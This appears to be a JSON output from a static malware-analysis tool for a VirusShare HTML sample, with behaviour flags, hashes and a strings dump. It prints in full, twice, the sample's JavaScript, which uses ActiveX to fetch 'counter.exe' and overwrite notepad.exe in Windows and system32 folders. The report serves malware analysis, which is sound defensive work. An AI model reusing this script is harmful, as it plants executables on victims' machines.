{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "ADODB.Stream": "May create a text file",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Microsoft.XMLHTTP": "May download files from the Internet",
            "Open": "May open a file",
            "SaveToFile": "May create a text file",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file"
        },
        "macro": "<script language=\"javascript\">\nvar DoWR=new Function(\"obj1\",\"obj2\",\"obj1.Write(obj2.responseBody)\");\nvar ldr = new ActiveXObject(\"Microsoft.XMLHTTP\");\nvar origMP = new ActiveXObject(\"Microsoft.XMLHTTP\");\nldr.Open(\"GET\", \"counter.exe\",0);\nldr.Send();\n\nvar s = new ActiveXObject(\"ADODB.Stream\");\ns.Mode = 3;\ns.Type = 1;\ns.Open();\nvar g_Restored=0;\n\nfunction FSave(path)\n{\n    DoWR(s,ldr);\n    lpath = \"file://\"+path.replace(/[\\\\]/g,\"/\")+\"notepad.exe\";\n    origMP.Open(\"GET\", lpath,0);\n    origMP.Send();\n    s.SaveToFile(path+\"notepad.exe\",2);\n    DoWR(s,origMP);\n    s.SaveToFile(path+\"notepad.exe.bak\",2);    \n}\nfunction FRestore(path)\n{\n    var sv = new ActiveXObject(\"ADODB.Stream\");\n    sv.Mode = 3;\n    sv.Type = 1;\n    sv.Open();\n    var tMP = new ActiveXObject(\"Microsoft.XMLHTTP\");\n    lpath = \"file://\"+path.replace(/[\\\\]/g,\"/\")+\"notepad.exe.bak\";\n    tMP.Open(\"GET\", lpath,0);\n    tMP.Send();\n    DoWR(sv,tMP);\n    sv.SaveToFile(path+\"notepad.exe\",2); \n    g_Restored=1;\n}\ntry{\n    FSave(\"C:\\\\Windows\\\\\");\n}catch (e){};\ntry{\n    FSave(\"D:\\\\windows\\\\\");\n}catch (e){};\ntry{\n    FSave(\"C:\\\\windows\\\\system32\\\\\");\n}catch (e){};\ntry{\n    FSave(\"D:\\\\windows\\\\system32\\\\\");\n}catch (e){};\n\nlocation.href = \"view-source:file://C:/\";\nfunction Restore() {\n    if (g_Restored==1)\n    {\n\treturn;\n    }\ntry {\n    try{\n        FRestore(\"C:\\\\windows\\\\\");\n    } catch (e) {};\n    try{\n        FRestore(\"D:\\\\windows\\\\\");\n    } catch (e) {};\n    try{\n        FRestore(\"C:\\\\windows\\\\system32\\\\\");\n    } catch (e) {};\n    try{\n        FRestore(\"d:\\\\windows\\\\system32\\\\\");\n    } catch (e) {};\n} catch (e) {};\n}\nsetTimeout(\"Restore()\",1000);\n    \n</script>"
    },
    "filename": "VirusShare_4abce2570c96a99e39f9caafbe4e2d30",
    "filesize": 1715,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "4abce2570c96a99e39f9caafbe4e2d30",
        "sha1": "123bc0190c7450382fa1c6dd7c3d00413cfe63bf",
        "sha256": "6223ab837fd386242c08a0bf7b174ca3ab6afd337e058814efabfe97d73136df"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<script language=\"javascript\">",
            "var DoWR=new Function(\"obj1\",\"obj2\",\"obj1.Write(obj2.responseBody)\");",
            "var ldr = new ActiveXObject(\"Microsoft.XMLHTTP\");",
            "var origMP = new ActiveXObject(\"Microsoft.XMLHTTP\");",
            "ldr.Open(\"GET\", \"counter.exe\",0);",
            "ldr.Send();",
            "var s = new ActiveXObject(\"ADODB.Stream\");",
            "s.Mode = 3;",
            "s.Type = 1;",
            "s.Open();",
            "var g_Restored=0;",
            "function FSave(path)",
            "    DoWR(s,ldr);",
            "    lpath = \"file://\"+path.replace(/[\\\\]/g,\"/\")+\"notepad.exe\";",
            "    origMP.Open(\"GET\", lpath,0);",
            "    origMP.Send();",
            "    s.SaveToFile(path+\"notepad.exe\",2);",
            "    DoWR(s,origMP);",
            "    s.SaveToFile(path+\"notepad.exe.bak\",2);    ",
            "function FRestore(path)",
            "    var sv = new ActiveXObject(\"ADODB.Stream\");",
            "    sv.Mode = 3;",
            "    sv.Type = 1;",
            "    sv.Open();",
            "    var tMP = new ActiveXObject(\"Microsoft.XMLHTTP\");",
            "    lpath = \"file://\"+path.replace(/[\\\\]/g,\"/\")+\"notepad.exe.bak\";",
            "    tMP.Open(\"GET\", lpath,0);",
            "    tMP.Send();",
            "    DoWR(sv,tMP);",
            "    sv.SaveToFile(path+\"notepad.exe\",2); ",
            "    g_Restored=1;",
            "try{",
            "    FSave(\"C:\\\\Windows\\\\\");",
            "}catch (e){};",
            "try{",
            "    FSave(\"D:\\\\windows\\\\\");",
            "}catch (e){};",
            "try{",
            "    FSave(\"C:\\\\windows\\\\system32\\\\\");",
            "}catch (e){};",
            "try{",
            "    FSave(\"D:\\\\windows\\\\system32\\\\\");",
            "}catch (e){};",
            "location.href = \"view-source:file://C:/\";",
            "function Restore() {",
            "    if (g_Restored==1)",
            "    {",
            "\treturn;",
            "    }",
            "try {",
            "    try{",
            "        FRestore(\"C:\\\\windows\\\\\");",
            "    } catch (e) {};",
            "    try{",
            "        FRestore(\"D:\\\\windows\\\\\");",
            "    } catch (e) {};",
            "    try{",
            "        FRestore(\"C:\\\\windows\\\\system32\\\\\");",
            "    } catch (e) {};",
            "    try{",
            "        FRestore(\"d:\\\\windows\\\\system32\\\\\");",
            "    } catch (e) {};",
            "} catch (e) {};",
            "setTimeout(\"Restore()\",1000);",
            "    ",
            "</script>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "file://",
            "file://C:/"
        ]
    },
    "time": "0:00:00.263793",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
